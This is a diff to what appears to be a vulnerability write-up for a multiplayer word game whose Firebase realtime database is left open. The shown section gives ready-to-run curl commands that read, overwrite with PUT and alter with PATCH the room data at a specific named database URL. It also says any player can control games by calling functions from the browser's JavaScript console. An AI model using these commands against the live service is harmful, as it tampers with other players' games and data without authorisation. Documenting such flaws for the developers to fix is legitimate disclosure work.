@@ -27,18 +27,23 @@ https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE].json
 ### MASTER_OOGWAY'S_SCRIBE
 
 This, in my opinion is the most dangerous vulnerability out of all of them. However, it wont work on chromebooks. This vuln allows the attacker(Not larper) to modify the actual database of anygame/file. How it works: 
+     
 To read:
-`curl 'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/ROOM_CODE.json' | jq`
+`curl 'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/ROOM_CODE.json' | jq`    
 
 To write: 
 `curl -i -X PUT \
   'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE_OR_CUSTOM_DB].json' \
   -H 'Content-Type: application/json' \
   --data '{"test":true, "instructions": write your custom DB here}'` 
+
+
+      
 OR(change the word to something custom example): `curl -i -X PATCH \
   'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE].json' \
   -H 'Content-Type: application/json' \
   --data '{"word":"ImDaBest"}'`
-if you pair this with REALITY_ROOM, and read the db that way, you can get full control over the game's db, which is obv bad.
+         
+  
 
 There are so many vulnerabilities because of client side logic, that you can simply control the MULTIPLAYER game with client side inspect element console. All you have to do is open the JS console and start running any functions of your choosing. I wont bother to write tools for this.
